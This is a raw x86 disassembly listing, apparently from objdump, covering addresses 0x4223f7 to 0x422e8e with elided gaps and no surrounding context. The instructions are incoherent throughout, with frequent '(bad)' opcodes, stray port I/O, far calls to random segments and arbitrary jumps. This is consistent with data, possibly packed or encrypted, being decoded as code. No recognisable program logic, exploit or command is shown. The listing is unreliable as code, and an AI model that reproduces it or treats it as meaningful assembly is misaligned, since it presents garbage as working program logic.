  4223f7:	adc    DWORD PTR [esi+0x1c],esp
  4223fa:	arpl   ax,ax
  4223fc:	xor    BYTE PTR [esi+0x4c7028c8],ch
  422402:	mov    esp,0xbef450f6
  422407:	repz pop edx
  422409:	inc    esi
  42240a:	cld    
  42240b:	add    al,0xef
  42240d:	pop    es
  42240e:	clc    
  42240f:	jmp    0x422414
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	test   al,0x14
  422482:	cmp    al,0x61
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	(bad)  
  42248d:	scas   eax,DWORD PTR es:[edi]
  42248e:	push   ecx
  42248f:	out    0xe2,al
  422491:	adc    al,0xa0
  422493:	(bad)  
  422494:	cmp    esp,DWORD PTR [ecx]
  422496:	pop    ebx
  422497:	push   eax
  422498:	stos   BYTE PTR es:[edi],al
  422499:	fisub  WORD PTR [ebp+0x554d17be]
  42249f:	sub    cl,dh
  4224a1:	or     DWORD PTR [ecx-0xece7368],eax
  4224a7:	call   0xcdc7:0xe9b55c98
  4224ae:	into   
  4224af:	ret    
  4224b0:	cmp    DWORD PTR [ecx+0xb816beb],esp
  4224b6:	xchg   edi,eax
  4224b7:	aad    0xa1
  4224b9:	dec    ecx
  4224ba:	push   0x80324d36
  4224bf:	sbb    eax,0x42ce5875
  4224c4:	and    bl,BYTE PTR [eax-0x7b]
  4224c7:	inc    edx
  4224c8:	cmp    esp,eax
  4224ca:	out    dx,al
  4224cb:	pop    edi
  4224cc:	lods   eax,DWORD PTR ds:[esi]
  4224cd:	stos   DWORD PTR es:[edi],eax
  4224ce:	sub    eax,0x21a37997
  4224d3:	scas   eax,DWORD PTR es:[edi]
  4224d4:	mov    eax,0xf6c958ea
  4224d9:	sub    edx,DWORD PTR [ecx+0x22]
  4224dc:	jo     0x4224ad
  4224de:	out    0x6f,eax
  4224e0:	stos   BYTE PTR es:[edi],al
  4224e1:	and    DWORD PTR [edi],eax
  4224e3:	mov    DWORD PTR [esi+0x50],edx
  4224e6:	pusha  
  4224e7:	cmp    esp,DWORD PTR [edi-0x37]
  4224ea:	ret    
  4224eb:	inc    edx
  4224ec:	or     bl,bh
  4224ee:	stos   BYTE PTR es:[edi],al
  4224ef:	fadd   DWORD PTR [edx-0x618b4ce]
  4224f5:	cmp    eax,0x79a06701
  4224fa:	mov    ah,0xf2
  4224fc:	push   edi
  4224fd:	pop    ds
  4224fe:	xor    ebx,DWORD PTR [ecx+0xf]
  422501:	mov    ch,0x3a
  422503:	sub    DWORD PTR [ebx-0x33],0x6d88ffdc
  42250a:	pop    es
  42250b:	stos   BYTE PTR es:[edi],al
  42250c:	mov    edi,0x3ea7f15
  422511:	dec    edi
  422512:	fwait
  422513:	xor    bh,BYTE PTR [ecx-0x76487a75]
  422519:	mov    esp,0xfad25999
  42251e:	mov    dl,0x16
  422520:	inc    esp
  422521:	mov    al,0xab
  422523:	fisub  WORD PTR [eax+0x7e6f3d79]
  422529:	mov    edx,0x354e4545
  42252e:	sbb    ebx,DWORD PTR [edi]
  422530:	(bad)  
  422531:	or     al,BYTE PTR [eax+0x43]
  422534:	xor    DWORD PTR ds:0xe631f04f,ebp
  42253a:	add    edx,DWORD PTR [edi-0x20]
  42253d:	outs   dx,BYTE PTR gs:[esi]
  42253f:	into   
  422540:	popf   
  422541:	aad    0xe5
  422543:	mov    edi,0x393443da
  422548:	xchg   ebp,eax
  422549:	jno    0x4224dd
  42254b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254c:	xor    eax,0xe8730b2f
  422551:	es ins BYTE PTR es:[edi],dx
  422553:	push   edi
  422554:	fstp   st(1)
  422556:	mov    ch,0x27
  422558:	scas   eax,DWORD PTR es:[edi]
  422559:	enter  0xc6d1,0x96
  42255d:	jl     0x4225d5
  42255f:	leave  
  422560:	ret    0xf913
  422563:	fnsave [eax-0x56]
  422566:	(bad)  
  422567:	out    0x2b,al
  422569:	adc    ebp,esi
  42256b:	dec    edx
  42256c:	xlat   BYTE PTR ds:[ebx]
  42256d:	stos   BYTE PTR es:[edi],al
  42256e:	call   0x615b78ea
  422573:	hlt    
  422574:	xchg   esp,eax
  422575:	sbb    DWORD PTR [esi+0x7a9a7af],edx
  42257b:	aam    0xe6
  42257d:	mov    esp,0x86b97a06
  422582:	inc    edx
  422583:	in     al,dx
  422584:	jle    0x422587
  422586:	repnz les esp,FWORD PTR [ebp-0x63139ec1]
  42258d:	retf   
  42258e:	mov    es,WORD PTR [ebp+0x0]
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x15865d08]
  422602:	test   BYTE PTR [ebp+0x16e44],0x4
  422609:	add    DWORD PTR [eax],eax
  42260b:	add    BYTE PTR [edi],bl
  42260d:	push   esi
  42260e:	aaa    
  42260f:	and    ecx,edi
  422611:	ret    
  422612:	cmp    eax,DWORD PTR [ebx]
  422614:	outs   dx,DWORD PTR ds:[esi]
  422615:	arpl   WORD PTR [esi-0x7c],cx
  422618:	or     bl,BYTE PTR [ebx]
  42261a:	sbb    al,0xf5
  42261c:	add    eax,0x3e473822
  422621:	cs pushf 
  422623:	mov    ebp,0xdecfcbe4
  422628:	popf   
  422629:	fidiv  DWORD PTR [ebx-0x6edbdbd3]
  42262f:	xchg   esp,eax
  422630:	rol    BYTE PTR [eax+ebp*2],1
  422633:	fidivr WORD PTR [ebp-0x39]
  422636:	ret    
  422637:	addr16 rol ecx,cl
  42263a:	bound  edx,QWORD PTR [ecx+0x56fb2e3e]
  422640:	in     eax,dx
  422641:	jo     0x4225d5
  422643:	pop    eax
  422644:	pop    ss
  422645:	mov    ecx,0x91326d45
  42264a:	or     eax,0xdc73faf
  42264f:	jo     0x422624
  422651:	outs   dx,BYTE PTR ds:[esi]
  422652:	mov    bh,0xd
  422654:	add    al,ch
  422656:	sub    cl,BYTE PTR [edx-0x7c108a72]
  42265c:	lods   eax,DWORD PTR ds:[esi]
  42265d:	call   0x2ac500b7
  422662:	mov    ebx,0x4ce0c136
  422667:	stos   BYTE PTR es:[edi],al
  422668:	mov    esi,0xfa3e0914
  42266d:	popf   
  42266e:	dec    ebp
  42266f:	pop    esi
  422670:	shl    DWORD PTR [edi-0x7af12960],0x56
  422677:	pop    ss
  422678:	aad    0xe5
  42267a:	pop    edi
  42267b:	xor    BYTE PTR [ecx-0x21fc443c],dh
  422681:	int3   
  422682:	ret    0xa69f
  422685:	arpl   WORD PTR [ecx-0x1b],bp
  422688:	add    al,dl
  42268a:	adc    BYTE PTR [edx],dh
  42268c:	icebp  
  42268d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268e:	push   ebx
  42268f:	fadd   DWORD PTR [esi+0x1b243288]
  422695:	adc    eax,0xe89639a6
  42269a:	inc    esi
  42269b:	aas    
  42269c:	fdivr  QWORD PTR [ebx+0x23]
  42269f:	and    DWORD PTR [ebx+0x2d40c4d5],edx
  4226a5:	mov    BYTE PTR ds:0xbb0b8129,ch
  4226ab:	addr16 jno 0x4226c6
  4226ae:	inc    ebx
  4226af:	jle    0x422680
  4226b1:	push   ecx
  4226b2:	push   ebx
  4226b3:	aaa    
  4226b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b5:	pop    edx
  4226b6:	pop    esp
  4226b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b8:	sahf   
  4226b9:	daa    
  4226ba:	sbb    eax,DWORD PTR [eax-0x3c]
  4226bd:	sahf   
  4226be:	add    BYTE PTR [esi+0x1e217183],0x8c
  4226c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226c6:	add    DWORD PTR [esi],ebp
  4226c8:	daa    
  4226c9:	pop    eax
  4226ca:	sbb    al,0x13
  4226cc:	popf   
  4226cd:	(bad)  
  4226ce:	fucomp st(5)
  4226d0:	fld    TBYTE PTR [eax-0x3d]
  4226d3:	push   esi
  4226d4:	dec    eax
  4226d5:	out    dx,eax
  4226d6:	in     eax,dx
  4226d7:	fld    TBYTE PTR [ecx+0x719c5412]
  4226dd:	push   edi
  4226de:	inc    esp
  4226df:	fs add eax,0xb56361b2
  4226e5:	xchg   esi,eax
  4226e6:	pop    esi
  4226e7:	inc    esp
  4226e8:	push   es
  4226e9:	(bad)  
  4226ea:	jp     0x4226ab
  4226ec:	fldln2 
  4226ee:	iret   
  4226ef:	jno    0x42276a
  4226f1:	push   esp
  4226f2:	pop    ds
  4226f3:	mov    esi,edi
  4226f5:	mov    cl,BYTE PTR [eax-0x10]
  4226f8:	sbb    DWORD PTR ss:[edx-0x15],ebx
  4226fc:	aad    0x52
  4226fe:	push   esp
  4226ff:	sub    al,0x6c
  422701:	cmp    cl,BYTE PTR ds:0x6eabe831
  422707:	jne    0x422697
  422709:	lds    edi,FWORD PTR [ecx]
  42270b:	push   ss
  42270c:	in     eax,0x34
  42270e:	adc    bh,BYTE PTR [esi+0x0]
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x6d7f01c8
  422781:	enter  0x2766,0x48
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	(bad)  
  42278e:	fldenv [ebp+0x2e]
  422791:	loop   0x4227ee
  422793:	cmp    DWORD PTR [ecx+eiz*2+0xd6da561],0x2df5fd18
  42279e:	mov    edx,0xeacdbb1c
  4227a3:	mov    ebp,0xf5647e65
  4227a8:	les    esi,FWORD PTR [eax-0x55]
  4227ab:	xor    al,0xa0
  4227ad:	mov    esp,DWORD PTR [eax]
  4227af:	pop    edi
  4227b0:	jecxz  0x4227bb
  4227b2:	ret    
  4227b3:	xor    eax,0x4c8ed5b3
  4227b8:	das    
  4227b9:	add    eax,DWORD PTR [edi]
  4227bb:	sub    DWORD PTR [edi+eax*4+0x3f12d6cc],0xb91a7b87
  4227c6:	cld    
  4227c7:	jb     0x422797
  4227c9:	or     eax,0x20e4ae2
  4227ce:	push   cs
  4227cf:	into   
  4227d0:	inc    BYTE PTR [ebx+0x25668ad0]
  4227d6:	gs mov ch,0x92
  4227d9:	int3   
  4227da:	repz pop es
  4227dc:	jns    0x4227b4
  4227de:	mov    esp,0xa30cd07e
  4227e3:	pop    edx
  4227e4:	sub    ebp,DWORD PTR [ebp+0x6d]
  4227e7:	jl     0x4227f2
  4227e9:	test   BYTE PTR [eax+0x76ee058c],dh
  4227ef:	dec    edx
  4227f0:	jno    0x42280f
  4227f2:	sbb    al,0x92
  4227f4:	ficomp DWORD PTR [ecx]
  4227f6:	jg     0x4227b1
  4227f8:	loope  0x4227eb
  4227fa:	xchg   ebx,eax
  4227fb:	mov    ebx,0x530a4294
  422800:	pop    edx
  422801:	or     esp,DWORD PTR [eax-0x1c]
  422804:	adc    eax,0xc1987b97
  422809:	or     edx,DWORD PTR [esi-0x7d]
  42280c:	push   edi
  42280d:	(bad)  
  42280e:	sub    BYTE PTR [eax+0x663d7ee9],ch
  422814:	jae    0x422815
  422816:	mov    dl,0x99
  422818:	fs jae 0x4227c9
  42281b:	add    BYTE PTR [edx],al
  42281d:	inc    edi
  42281e:	jno    0x4227bf
  422820:	(bad)  
  422821:	push   esi
  422822:	inc    ecx
  422823:	cmp    esi,DWORD PTR [ebp+0x45e57907]
  422829:	cmp    ecx,esi
  42282b:	push   ebp
  42282c:	(bad)  
  42282e:	or     al,dh
  422830:	or     BYTE PTR [ebx+0x2d],ah
  422833:	jmp    0x80a4:0xeeefb078
  42283a:	dec    edi
  42283b:	(bad)  
  42283c:	or     al,0x39
  42283e:	push   ecx
  42283f:	xchg   BYTE PTR [edi+0xb],ah
  422842:	mov    dh,0xfe
  422844:	sbb    ch,BYTE PTR [ebx]
  422846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422847:	(bad)  
  422848:	xchg   ebx,eax
  422849:	mov    ebp,0x3e5e5921
  42284e:	cdq    
  42284f:	pop    edi
  422850:	cmp    ah,BYTE PTR [edx-0x4a5dcd99]
  422856:	cmp    cl,al
  422858:	iret   
  422859:	xor    BYTE PTR [esi],ah
  42285b:	imul   edi,edx,0x4c
  42285e:	mov    esp,DWORD PTR [edi+0x1c]
  422861:	fidiv  WORD PTR [edx+edx*8]
  422864:	xor    ebp,ebp
  422866:	adc    ebp,DWORD PTR [edi]
  422868:	fs arpl dx,bx
  42286b:	push   es
  42286c:	in     eax,0x49
  42286e:	je     0x422855
  422870:	adc    eax,0x5d1e2095
  422875:	jle    0x42283f
  422877:	and    al,0x2a
  422879:	ror    BYTE PTR [edi+0x66ca6a7b],cl
  42287f:	mov    ch,0x14
  422881:	xor    edx,DWORD PTR [ecx]
  422883:	cdq    
  422884:	aad    0xbb
  422886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422887:	mov    edi,0x91e01f0e
  42288c:	dec    ebp
  42288d:	ins    DWORD PTR es:[edi],dx
  42288e:	aam    0x76
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422975
  422901:	aad    0x77
  422903:	ds dec esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	ficomp DWORD PTR [ecx-0x358b8ac]
  422912:	daa    
  422913:	mov    ebp,0x8be16905
  422918:	fs sbb al,0xe1
  42291b:	adc    BYTE PTR [eax+0x78abcddb],bl
  422921:	mov    edi,0x6f557c99
  422926:	jle    0x422968
  422928:	mov    eax,0x1443aa0b
  42292d:	adc    dl,ch
  42292f:	mov    cl,0xf4
  422931:	push   edi
  422932:	shl    DWORD PTR [edi],0xac
  422935:	lock mov BYTE PTR [edx+0x2f],bl
  422939:	stos   BYTE PTR es:[edi],al
  42293a:	data16 cld 
  42293c:	dec    ebx
  42293d:	mov    bh,0x3
  42293f:	sbb    esp,edx
  422941:	out    0xa1,eax
  422943:	(bad)  
  422944:	pop    eax
  422945:	adc    eax,DWORD PTR [ebp+0x26281556]
  42294b:	push   esi
  42294c:	xor    DWORD PTR [esi-0x35],0x1cef8f0e
  422953:	cmp    esp,DWORD PTR [eax-0x6]
  422956:	sub    bl,BYTE PTR [ebp-0x1eaa5faf]
  42295c:	pop    esi
  42295d:	mov    eax,0xb3c2c998
  422962:	sub    cl,ah
  422964:	mov    al,ds:0xf9d1fe05
  422969:	jg     0x42297b
  42296b:	add    edx,DWORD PTR [edx]
  42296d:	mov    edx,0xf4c8449d
  422972:	pop    edx
  422973:	jo     0x4229d8
  422975:	lods   eax,DWORD PTR ds:[esi]
  422976:	cmp    dh,BYTE PTR [edx-0x69]
  422979:	fstp   TBYTE PTR [eax-0x5cf39142]
  42297f:	jg     0x4229c4
  422981:	jle    0x422942
  422983:	addr16 cdq 
  422985:	lods   al,BYTE PTR ds:[esi]
  422986:	and    BYTE PTR [ebx+0x5],al
  422989:	sbb    esp,DWORD PTR [edi-0x25]
  42298c:	and    DWORD PTR [ebp+0x35afcb9f],0xfffffffb
  422993:	pop    ss
  422994:	imul   ebp,DWORD PTR [edx+0x2db2b60a],0xffffffcb
  42299b:	nop
  42299c:	sub    ebp,DWORD PTR [esi+0x7a]
  42299f:	xchg   ebx,eax
  4229a0:	add    DWORD PTR [edx-0x4baafcf6],edx
  4229a6:	cmp    BYTE PTR [ebx+0x61ca1b4e],dl
  4229ac:	icebp  
  4229ad:	loopne 0x4229ad
  4229af:	cmp    BYTE PTR [edi],0x24
  4229b2:	push   edi
  4229b3:	mov    BYTE PTR ds:[edx+0x11c673ad],ah
  4229ba:	loopne 0x4229a0
  4229bc:	pop    esp
  4229bd:	xchg   BYTE PTR [edi-0x49dca6b1],dl
  4229c3:	mov    dl,0x9f
  4229c5:	daa    
  4229c6:	es scas eax,DWORD PTR es:[edi]
  4229c8:	in     eax,0x0
  4229ca:	int    0x32
  4229cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229cd:	pop    ecx
  4229ce:	daa    
  4229cf:	aaa    
  4229d0:	ja     0x4229d0
  4229d2:	ins    DWORD PTR es:[edi],dx
  4229d3:	stos   BYTE PTR es:[edi],al
  4229d4:	sub    al,0x34
  4229d6:	rol    dh,0xb2
  4229d9:	ret    0x2196
  4229dc:	sahf   
  4229dd:	add    ecx,DWORD PTR ds:0x74b0558e
  4229e3:	aad    0xa8
  4229e5:	in     al,0xb4
  4229e7:	ss into 
  4229e9:	in     al,dx
  4229ea:	enter  0x5a9b,0xea
  4229ee:	pop    edx
  4229ef:	push   edi
  4229f0:	(bad)  
  4229f2:	inc    ecx
  4229f3:	popf   
  4229f4:	mov    dh,0xc3
  4229f6:	xchg   esp,eax
  4229f7:	jmp    0x5f0bfe20
  4229fc:	mov    ?,esi
  4229fe:	push   ebx
  4229ff:	dec    ebx
  422a00:	xor    al,0x1a
  422a02:	test   cl,dh
  422a04:	sar    BYTE PTR [ebx+0x76],0xcd
  422a08:	repz jno 0x4229cd
  422a0b:	push   cs
  422a0c:	xchg   DWORD PTR [ecx+0xe],edi
  422a0f:	mov    BYTE PTR [eax],al
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	cs pop esi
  422a82:	xchg   esi,eax
  422a83:	not    BYTE PTR [eax+0x71]
  422a86:	add    DWORD PTR [eax],eax
  422a88:	add    al,0x1
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	sbb    DWORD PTR [ecx-0x5122ee75],ebx
  422a92:	repz sbb edi,0x9d5fa6d7
  422a99:	(bad)  
  422a9b:	mov    ds:0xae6673fd,al
  422aa0:	jo     0x422aa6
  422aa2:	stos   DWORD PTR es:[edi],eax
  422aa3:	popa   
  422aa4:	sbb    esi,edi
  422aa6:	add    dl,BYTE PTR [ebx]
  422aa8:	sub    eax,0x68890c32
  422aad:	or     cl,BYTE PTR [ecx]
  422aaf:	xchg   al,dl
  422ab1:	pop    ecx
  422ab2:	xchg   esp,eax
  422ab3:	push   ecx
  422ab4:	cmp    eax,0xc29eace6
  422ab9:	pop    ds
  422aba:	in     al,0x24
  422abc:	(bad)  [edx]
  422abe:	and    cl,BYTE PTR [edi+0x7b4298bb]
  422ac4:	jns    0x422a5d
  422ac6:	inc    edx
  422ac7:	ins    BYTE PTR es:[edi],dx
  422ac8:	dec    edx
  422ac9:	int    0x29
  422acb:	mov    ah,0xc8
  422acd:	xor    ecx,DWORD PTR [ecx-0x61]
  422ad0:	inc    edx
  422ad1:	cld    
  422ad2:	mov    ecx,0x30d27692
  422ad7:	out    dx,al
  422ad8:	jp     0x422ac7
  422ada:	inc    ebx
  422adb:	(bad)  [ebp+0x2e]
  422ade:	sar    BYTE PTR [ebx+0x21],1
  422ae1:	pop    ss
  422ae2:	daa    
  422ae3:	sub    DWORD PTR [esi+0x1f9ce5a2],ebx
  422ae9:	(bad)  
  422aea:	loope  0x422b14
  422aec:	cmp    edx,ecx
  422aee:	nop
  422aef:	mov    WORD PTR [ebp+0x5a38938],cs
  422af5:	xor    dh,bl
  422af7:	or     DWORD PTR [esi-0x16ff74ff],edx
  422afd:	jns    0x422abb
  422aff:	mov    ch,ah
  422b01:	cmp    ah,bh
  422b03:	push   ss
  422b04:	ret    0xcf0d
  422b07:	mov    eax,DWORD PTR ds:0xef88ede7
  422b0d:	sub    bl,BYTE PTR [edi+ebp*2+0x3edd794b]
  422b14:	je     0x422b43
  422b16:	neg    BYTE PTR [esi+0x56]
  422b19:	pop    es
  422b1a:	fnsave [edi]
  422b1c:	mov    cl,0x9d
  422b1e:	fcmovnbe st,st(7)
  422b20:	and    al,0xf1
  422b22:	(bad)  
  422b23:	ret    
  422b24:	jae    0x422b90
  422b26:	repz xor dl,bh
  422b29:	push   esp
  422b2a:	call   DWORD PTR [ecx+0x6]
  422b2d:	fwait
  422b2e:	js     0x422aef
  422b30:	jmp    0x784a89d1
  422b35:	sub    eax,0x8ff3913e
  422b3a:	lahf   
  422b3b:	add    eax,0x31e6510a
  422b40:	cs jne 0x422ae7
  422b43:	jg     0x422b76
  422b45:	imul   ebp,edi,0xffffff90
  422b48:	sbb    al,ah
  422b4a:	mov    ebp,0x3e241082
  422b4f:	xlat   BYTE PTR ds:[ebx]
  422b50:	xor    dh,dh
  422b52:	xchg   BYTE PTR [edi-0x1481a665],dh
  422b58:	jae    0x422b94
  422b5a:	repz es mov edi,0xcab9583c
  422b61:	ja     0x422bad
  422b63:	stos   BYTE PTR es:[edi],al
  422b64:	ror    DWORD PTR [ebx+0x3ac4acf9],1
  422b6a:	mov    ds:0x9077a6b4,eax
  422b6f:	mov    esi,0x58d3bc49
  422b74:	jge    0x422b0e
  422b76:	dec    edx
  422b77:	or     BYTE PTR [ebx],ah
  422b79:	(bad)  
  422b7b:	imul   edi,DWORD PTR [ecx+0x402b0f8e],0xed870fc7
  422b85:	lods   al,BYTE PTR ds:[esi]
  422b86:	mov    BYTE PTR [ecx+0x16180d62],cl
  422b8c:	and    eax,0x8e1909
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x1b1f4d9c]
  422c02:	or     BYTE PTR [ebx+0x54],dl
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	fstp   TBYTE PTR [ebp+0x53]
  422c0f:	sar    BYTE PTR [ebx-0x7f],cl
  422c12:	xchg   ecx,eax
  422c13:	ret    
  422c14:	push   ds
  422c15:	ret    
  422c16:	jp     0x422bba
  422c18:	cld    
  422c19:	xchg   esi,eax
  422c1a:	out    0xc,eax
  422c1c:	mov    al,ds:0x749be301
  422c21:	call   0xd511:0x9ad3317c
  422c28:	xor    al,0x15
  422c2a:	or     ecx,DWORD PTR [edi+edi*8-0x1ade5569]
  422c31:	and    eax,0x6e71c8af
  422c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c37:	and    BYTE PTR [ebp-0x2e],al
  422c3a:	shl    edx,cl
  422c3c:	je     0x422cb4
  422c3e:	mov    esi,0x7673b5d6
  422c43:	cld    
  422c44:	adc    DWORD PTR [ebp+0x69],0xffffffd3
  422c48:	jmp    0xe4b5:0xd7c28942
  422c4f:	gs xchg edi,eax
  422c51:	loop   0x422c88
  422c53:	sbb    al,bh
  422c55:	ror    dh,cl
  422c57:	loope  0x422c9c
  422c59:	cmc    
  422c5a:	add    al,0x75
  422c5c:	mov    ds:0xb696f848,al
  422c61:	out    0xd3,eax
  422c63:	xchg   ebx,eax
  422c64:	loop   0x422cb2
  422c66:	xchg   edi,eax
  422c67:	inc    eax
  422c68:	mov    eax,DWORD PTR [edx-0x65]
  422c6b:	scas   al,BYTE PTR es:[edi]
  422c6c:	ret    
  422c6d:	ror    BYTE PTR [eax],1
  422c6f:	inc    esp
  422c70:	jecxz  0x422c89
  422c72:	push   0x8b8d35f6
  422c77:	jle    0x422c91
  422c79:	mov    ch,0x80
  422c7b:	push   cs
  422c7c:	jg     0x422c04
  422c7e:	xor    bl,dl
  422c80:	jmp    0x91008408
  422c85:	mov    edi,0x51887a14
  422c8a:	add    bl,BYTE PTR [ecx-0x68]
  422c8d:	xor    ebp,DWORD PTR [ebx]
  422c8f:	adc    DWORD PTR [ecx+edi*4-0x52a5c126],ecx
  422c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c97:	jge    0x422c6c
  422c99:	or     BYTE PTR [ebx-0x7b3886f6],dl
  422c9f:	pop    ebx
  422ca0:	jno    0x422c91
  422ca2:	lock xchg ecx,eax
  422ca4:	jae    0x422d1a
  422ca6:	and    DWORD PTR [esi-0x74],ebx
  422ca9:	mov    ecx,0x2386a391
  422cae:	mov    WORD PTR [edx],fs
  422cb0:	in     eax,0xc7
  422cb2:	fistp  WORD PTR [edx+0x3a]
  422cb5:	sbb    BYTE PTR [edi*8-0x62de7a88],0x41
  422cbd:	sbb    eax,0x3d13c3a6
  422cc2:	lock mov ah,0xba
  422cc5:	xor    dl,BYTE PTR [edi]
  422cc7:	jae    0x422c52
  422cc9:	mov    ebp,0x79b067d1
  422cce:	xchg   edx,eax
  422ccf:	retf   0xf2f1
  422cd2:	xchg   edx,eax
  422cd3:	mov    WORD PTR [ebp+0x17e9cd27],cs
  422cd9:	inc    edi
  422cda:	nop
  422cdb:	xchg   ebp,eax
  422cdc:	or     ch,al
  422cde:	mov    fs,WORD PTR [ecx]
  422ce0:	and    ah,BYTE PTR [ebx-0x5f]
  422ce3:	mov    edi,0x94e67ba1
  422ce8:	inc    eax
  422ce9:	cmp    eax,0x278479d8
  422cee:	pop    es
  422cef:	mov    ds:0xc05ba5e5,eax
  422cf4:	rcr    DWORD PTR [ebp+0x44],0x8a
  422cf8:	pop    eax
  422cf9:	cs mov al,0x9b
  422cfc:	or     al,0xe
  422cfe:	ss jecxz 0x422d6b
  422d01:	jg     0x422d4a
  422d03:	retf   
  422d04:	xchg   edx,eax
  422d05:	add    DWORD PTR [ecx-0x62eb6992],ebx
  422d0b:	mov    dl,ch
  422d0d:	scas   eax,DWORD PTR es:[edi]
  422d0e:	or     dl,dl
	...
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebx,DWORD PTR [ecx+0x584610cc]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	ss dec eax
  422d8e:	adc    al,ch
  422d90:	(bad)  
  422d91:	dec    ecx
  422d92:	ja     0x422da2
  422d94:	add    DWORD PTR [ebp+0x732e2f85],0xffffffbe
  422d9b:	gs xor al,al
  422d9e:	in     eax,dx
  422d9f:	xchg   esp,eax
  422da0:	sub    DWORD PTR [esi+0x11],ebx
  422da3:	adc    cl,BYTE PTR [edx]
  422da5:	push   0xbd86932
  422daa:	fs je  0x422d70
  422dad:	sbb    esi,esi
  422daf:	int3   
  422db0:	xor    BYTE PTR [edi],bl
  422db2:	and    bl,BYTE PTR [esi-0x19756555]
  422db8:	mov    al,0xf6
  422dba:	retf   0x8419
  422dbd:	clc    
  422dbe:	xor    esp,DWORD PTR [ebx-0x7b967807]
  422dc4:	or     cl,BYTE PTR [ecx]
  422dc6:	outs   dx,DWORD PTR ds:[esi]
  422dc7:	out    dx,al
  422dc8:	pop    ebp
  422dc9:	dec    esi
  422dca:	fnstcw WORD PTR [edi+0x50d7d4c2]
  422dd0:	mov    esp,0x3d21e2c9
  422dd5:	fidiv  WORD PTR [ebx]
  422dd7:	xchg   esp,eax
  422dd8:	or     DWORD PTR [esi+0x5f215a35],0x150d4507
  422de2:	daa    
  422de3:	sbb    DWORD PTR [eax+0x62],esi
  422de6:	ret    
  422de7:	retf   0xd4d7
  422dea:	loope  0x422d72
  422dec:	cmp    eax,0x1e2db355
  422df1:	and    DWORD PTR [ebx-0x210a153b],0xb9e520c
  422dfb:	xchg   edi,eax
  422dfc:	xor    cl,ch
  422dfe:	push   esi
  422dff:	fisub  DWORD PTR [edx-0x16a63087]
  422e05:	test   edx,eax
  422e07:	out    0x50,al
  422e09:	call   0xe0f0:0xcffedcd7
  422e10:	pop    es
  422e11:	std    
  422e12:	into   
  422e13:	ror    edx,cl
  422e15:	pop    eax
  422e16:	jecxz  0x422dc4
  422e18:	loopne 0x422e86
  422e1a:	add    BYTE PTR ds:0x27a57afc,dl
  422e20:	push   edi
  422e21:	imul   ebp,DWORD PTR [esi],0x42725586
  422e27:	shl    DWORD PTR [ecx+ecx*4],cl
  422e2a:	inc    edi
  422e2b:	sbb    BYTE PTR [eax],0xd
  422e2e:	push   ds
  422e2f:	pop    edx
  422e30:	retf   0xd718
  422e33:	sub    cl,al
  422e35:	jmp    0x28b8:0xdd905814
  422e3c:	add    eax,0xcf73144c
  422e41:	ss xchg edi,eax
  422e43:	ret    0x3c1b
  422e46:	mov    ?,esi
  422e48:	arpl   WORD PTR [eax],bx
  422e4a:	sub    ch,dl
  422e4c:	sti    
  422e4d:	leave  
  422e4e:	in     eax,0xf1
  422e50:	mov    eax,0x6ad225ba
  422e55:	sub    eax,0x3420286c
  422e5a:	mov    eax,ds:0x61e7e471
  422e5f:	inc    eax
  422e60:	fild   QWORD PTR [edx-0x15]
  422e63:	xchg   BYTE PTR [esi-0x2c],bh
  422e66:	and    DWORD PTR [esi+0x104562c1],esp
  422e6c:	inc    ecx
  422e6d:	push   ebp
  422e6e:	sub    BYTE PTR [ebp+0x5b],bl
  422e71:	or     eax,0x724f98e3
  422e76:	call   0x8b54:0x4ce0ea62
  422e7d:	pushf  
  422e7e:	ins    BYTE PTR es:[edi],dx
  422e7f:	or     eax,0xee2c310
  422e84:	outs   dx,BYTE PTR ds:[esi]
  422e85:	fldcw  WORD PTR [eax+0x75]
  422e88:	arpl   bp,si
  422e8a:	call   DWORD PTR [ebx]
  422e8c:	ja     0x422f03
  422e8e:	cmp    ebx,edi
	...
